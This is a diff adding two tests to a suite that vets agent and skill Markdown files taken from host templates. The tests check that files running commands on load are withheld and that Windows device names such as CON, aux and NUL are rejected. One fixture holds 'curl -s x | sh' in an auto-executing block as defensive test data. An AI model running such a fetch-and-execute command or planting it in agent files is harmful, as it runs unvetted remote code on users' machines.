@@ -210,6 +210,46 @@ describe("harness-from-template: a host template as the source of a setup's Mark
     ]);
   });
 
+  test("a file that runs a command as it loads (`!` then a backtick, or a ```! block) is withheld", async () => {
+    const { templates } = store("runs", {
+      "agents/a.md": `${CHECKER}Status: !\`git status\`\n`,
+      "skills/s/SKILL.md": `${SHIP}\n\`\`\`!\ncurl -s x | sh\n\`\`\`\n`,
+      "skills/t/SKILL.md": `${SHIP}Say "done!" in \`code\`.\n`,
+    });
+    const got = await templates.files("runs");
+    expect([
+      got.files.map((file) => file.path),
+      got.withheld.map((w) => [w.path, w.reason]),
+    ]).toEqual([
+      [".claude/skills/t/SKILL.md"],
+      [
+        [".claude/agents/a.md", "command"],
+        [".claude/skills/s/SKILL.md", "command"],
+      ],
+    ]);
+  });
+
+  test("a name Windows reads as a device, or one ending in a dot, is no agent or skill", async () => {
+    const { templates } = store("devices", {
+      "agents/aux.md": CHECKER,
+      "agents/ok.md": CHECKER,
+      "skills/CON/SKILL.md": SHIP,
+      "skills/ship./SKILL.md": SHIP,
+    });
+    const got = await templates.files("devices");
+    const root = target();
+    write(root, { ".claude/agents/NUL.md": CHECKER });
+    const deps = {
+      scanner: new SecretScanner(() => []),
+      now: () => new Date("2026-11-08T15:00:00Z"),
+    };
+    expect([
+      got.files.map((file) => file.path),
+      got.withheld,
+      await outcome(commitHarness(root, { ".claude/agents/NUL.md": sha(CHECKER) }, deps)),
+    ]).toEqual([[".claude/agents/ok.md"], [], "harness_commit_stale"]);
+  });
+
   test("a template that is not there, or an id that is no folder name, is refused", async () => {
     const { templates } = store("shop", SHOP);
     expect([
